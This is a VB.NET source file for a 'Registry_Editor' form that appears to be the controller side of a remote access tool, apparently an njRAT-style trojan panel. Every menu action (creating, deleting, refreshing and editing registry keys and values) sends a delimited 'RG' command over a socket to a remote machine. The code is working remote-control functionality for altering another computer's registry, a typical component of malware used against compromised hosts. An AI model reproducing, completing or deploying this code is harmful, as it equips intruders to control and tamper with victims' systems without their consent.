Imports System.Runtime.CompilerServices

Public Class Registry_Editor
    Public sock As Integer
    Public CN As Boolean
    Enum ProgressBarColor
        Green = &H1
        Red = &H2
        Yellow = &H3

    End Enum
    Declare Auto Function SendMessage Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal msg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    Public Shared Sub ChangeProgBarColor(ByVal ProgressBar_Name As Windows.Forms.ProgressBar, ByVal ProgressBar_Color As ProgressBarColor)
        SendMessage(ProgressBar_Name.Handle, &H410, ProgressBar_Color, 0)
    End Sub



    Private Sub CreateKeyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CreateKeyToolStripMenuItem.Click
        If ((Not RGk.SelectedNode Is Nothing) AndAlso RGk.SelectedNode.FullPath.Contains("\")) Then
            Dim str As String = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1)
            If (str.Length <> 0) Then
                Main.S.Send(sock, "RG" & Main.Yy & "#" & Main.Yy & RGk.SelectedNode.FullPath & "\" & Main.Yy & str)
            End If
        End If
    End Sub




    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Main.S.Send(sock, "RG" & Main.Yy & "~" & Main.Yy & RGk.SelectedNode.FullPath & "\")
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub DeleteKeyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteKeyToolStripMenuItem.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Dim fullPath As String = Me.RGk.SelectedNode.FullPath
            If fullPath.Contains("\") Then
                Dim str2 As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)((Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1))
                Dim str3 As String = ""
                Dim num2 As Integer = (Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2)
                Dim i As Integer = 0
                Do While (i <= num2)
                    str3 = (str3 & Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) & "\")
                    i += 1
                Loop
                Main.S.Send(sock, "RG" & Main.Yy & "$" & Main.Yy & str3 & Main.Yy & str2)
                Me.RGk.SelectedNode.Remove()
            End If
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RefreshToolStripMenuItem1.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Main.S.Send(sock, "RG" & Main.Yy & "~" & Main.Yy & RGk.SelectedNode.FullPath & "\")
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub EditToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EditToolStripMenuItem.Click
        RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(sender), e)
    End Sub

    Private Sub NewValueToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NewValueToolStripMenuItem.Click
        Dim gv As New Regedit
        Regedit.Path = RGk.SelectedNode.FullPath & "\"
        Regedit.sock = Me.sock
        Regedit.TextBox1.Text = "Name"
        Regedit.ComboBox1.SelectedIndex = Regedit.ComboBox1.Items.IndexOf("String")
        Regedit.TextBox3.Text = "Value"
        Regedit.Text = gv.Path
        Regedit.ShowDialog(Me)
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.RGLIST.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Main.S.Send(sock, "RG" & Main.Yy & "@5" & Main.Yy & RGk.SelectedNode.FullPath & "\" & Main.Yy & current.Text)
            Loop
        Finally

        End Try
    End Sub
    Private Sub RGk_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles RGk.DoubleClick
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Main.S.Send(sock, "RG" & Main.Yy & "~" & Main.Yy & RGk.SelectedNode.FullPath & "\" & Main.Yy)
            Me.RGLIST.Enabled = False
            '     Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub RGLIST_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles RGLIST.DoubleClick
        If (Me.RGLIST.SelectedItems.Count <> 0) Then
            Dim item As ListViewItem = Me.RGLIST.SelectedItems.Item(0)
            Dim gv As New Regedit
            Regedit.Path = (Me.RGk.SelectedNode.FullPath & "\")
            Regedit.sock = Me.sock
            Regedit.TextBox1.Text = item.Text
            Regedit.ComboBox1.SelectedIndex = Regedit.ComboBox1.Items.IndexOf(item.SubItems.Item(1).Text)
            Try
                Regedit.TextBox3.Text = item.SubItems.Item(2).Text
            Catch exception1 As Exception
                Dim exception As Exception = exception1
            End Try
            gv.Text = Regedit.Path
            Regedit.TextBox1.ReadOnly = True
            gv.ShowDialog(Me)
        End If
    End Sub

















    Private Sub Timer1_Tick_1(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick

    End Sub
End Class